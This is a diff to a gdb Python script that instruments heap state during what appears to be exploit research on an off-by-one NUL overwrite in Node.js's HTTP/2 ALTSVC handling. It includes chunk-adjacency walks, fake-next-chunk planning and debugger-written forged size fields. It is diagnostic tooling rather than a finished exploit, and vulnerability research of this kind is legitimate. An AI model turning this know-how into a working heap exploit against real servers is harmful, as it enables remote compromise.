@@ -44,6 +44,61 @@ def nul_class(length):
         return 'next prev_size byte %d — harmless' % off
     return 'own-chunk slack (off=%d) — harmless' % off
 
+def value_walk(hit):
+    # Wake 14: the ALTSVC `value` buffer is the SECOND MaybeStackBuffer
+    # in Http2Session::AltSvc (source pin node_http2_v24.22.2.cc:3324-3334),
+    # allocated right after `origin`. At nghttp2_submit_altsvc entry the
+    # SysV args are rcx=origin, r8=origin_len, r9=value, [rsp+8]=value_len.
+    # With a >1024-byte ALT, value is heap-adjacent to origin, so origin's
+    # kNullTerminate NUL can land on value's sizefield LSB and value is
+    # freed AFTER the corruption (C++ destructor order). Diagnostic only.
+    try:
+        vp = int(gdb.parse_and_eval('$r9'))
+    except Exception as e:
+        print('VALUE-WALK %d unavailable: %s' % (hit, e))
+        return
+    vlen = int(os.environ.get('VALUE_LEN', '0'), 0)
+    if vp == 0 or not (0x1000000 <= vp < 0x100000000):
+        print('VALUE-WALK %d ptr=0x%x len=%d implausible' % (hit, vp, vlen))
+        return
+    vc = vp - 0x10
+    vsf = rd_try(vc + 8)
+    if vsf is None:
+        print('VALUE-WALK %d ptr=0x%x len=%d chunk=0x%x UNREADABLE'
+              % (hit, vp, vlen, vc))
+        return
+    vsize = vsf & ~7
+    oc = int(gdb.parse_and_eval('$rcx')) - 0x10
+    olen = int(gdb.parse_and_eval('$r8'))
+    osz = (rd_try(oc + 8) or 0) & ~7
+    nl = nul_class(vlen) if vlen else 'len-unknown'
+    print('VALUE-WALK %d ptr=0x%x len=%d chunk=0x%x sizefield=0x%x (size=0x%x) %s'
+          % (hit, vp, vlen, vc, vsf, vsize, nl))
+    print('VALUE-WALK %d adjacency: origin=0x%x size=0x%x end=0x%x value=0x%x delta=0x%x'
+          % (hit, oc, osz, oc + osz, vc, vc - (oc + osz)))
+    # Where origin's own NUL landed (should be value's sizefield LSB if
+    # the lane is live): o_user + olen == vc + 8.
+    nul_at = oc + 0x10 + olen
+    print('VALUE-WALK %d origin-NUL@0x%x value+8=0x%x match=%s'
+          % (hit, nul_at, vc + 8, nul_at == vc + 8))
+    # Fake-next window for value's corrupted size: set_foot writes
+    # prev_size=value+'believed' on free, so only the sizefield there
+    # must be a sane even header.
+    believed = vsize & ~0xff
+    bn = vc + believed
+    print('VALUE-WALK %d believed=0x%x fake-next=0x%x prev_size=0x%x sizefield=0x%x'
+          % (hit, believed, bn, rd_try(bn) or 0, rd_try(bn + 8) or 0))
+    for a in range(bn - 0x10, bn + 0x20, 8):
+        q = rd_try(a)
+        print('VALUE-WALK %d   0x%x: 0x%016x' % (hit, a, q if q is not None else -1))
+    fso = os.environ.get('FAKE_SIZEONLY')
+    if fso and hit == 2:
+        gdb.parse_and_eval('*(unsigned long*)%d = %d'
+                           % (bn + 8, int(fso, 0)))
+        print('VALUE-WALK %d FAKE-SIZEONLY wrote sizefield=0x%x at 0x%x '
+              '(debugger, NOT attacker bytes; prev_size left for set_foot)'
+              % (hit, int(fso, 0), bn + 8))
+
 def walk_unsorted():
     rcx = int(gdb.parse_and_eval('$rcx'))
     r8  = int(gdb.parse_and_eval('$r8'))
@@ -132,6 +187,15 @@ def walk_unsorted():
 # abutting chunk itself via the chunk after it. Then walks O2.
 HITS = {'n': 0}
 
+def walk_unsorted_safe():
+    # Wake 14: a long ALT makes stale 'A'-filled free chunks look like
+    # unsorted links; a raw walk can fault and abort the whole gdb command
+    # file before the inferior returns. Diagnostics must not kill the run.
+    try:
+        walk_unsorted()
+    except Exception as e:
+        print('WALK-UNSORTED skipped: %s' % e)
+
 def multi_walk():
     rcx = int(gdb.parse_and_eval('$rcx'))
     r8  = int(gdb.parse_and_eval('$r8'))
@@ -141,13 +205,14 @@ def multi_walk():
     print('=== HIT %d ORIGIN ptr=0x%x len=%d chunk=0x%x sizefield=0x%x' %
           (hit, rcx, r8, o, rd(o + 8)))
     print('NUL-CLASS: %s' % nul_class(r8))
+    value_walk(hit)
     if hit == 1:
         HITS['o1'] = o
         HITS['len1'] = r8
         fp1 = o + 0xF + r8
         print('FAKE-PAIR@HIT1 0x%x qword=0x%x +8=0x%x +0x10=0x%x'
               % (fp1, rd_try(fp1), rd_try(fp1 + 8), rd_try(fp1 + 0x10)))
-        walk_unsorted()
+        walk_unsorted_safe()
         return
     o1 = HITS.get('o1', 0)
     # wake 11: the R1-origin "own-NUL" fake pair at o1+0xF+len1
@@ -210,7 +275,7 @@ def multi_walk():
                 gdb.parse_and_eval('*(unsigned long*)%d = %d' % (bno, bso))
                 print('O2==O1-FAKE-PATCH wrote sizefield=0x%x prev_size=0x%x at 0x%x (debugger)'
                       % (int(fpatch, 0), bso, bno))
-        walk_unsorted()
+        walk_unsorted_safe()
         return
     sf = rd_try(o1 + 8)
     if sf is None:
@@ -318,4 +383,4 @@ def multi_walk():
                 print('REAL-NEXT-CAND chunk=0x%x sizefield=0x%x prev_size=0x%x -> real size 0x%x'
                       % (v2 + k, sf2, rd_try(v2 + k) or 0, k))
                 break
-    walk_unsorted()
+    walk_unsorted_safe()
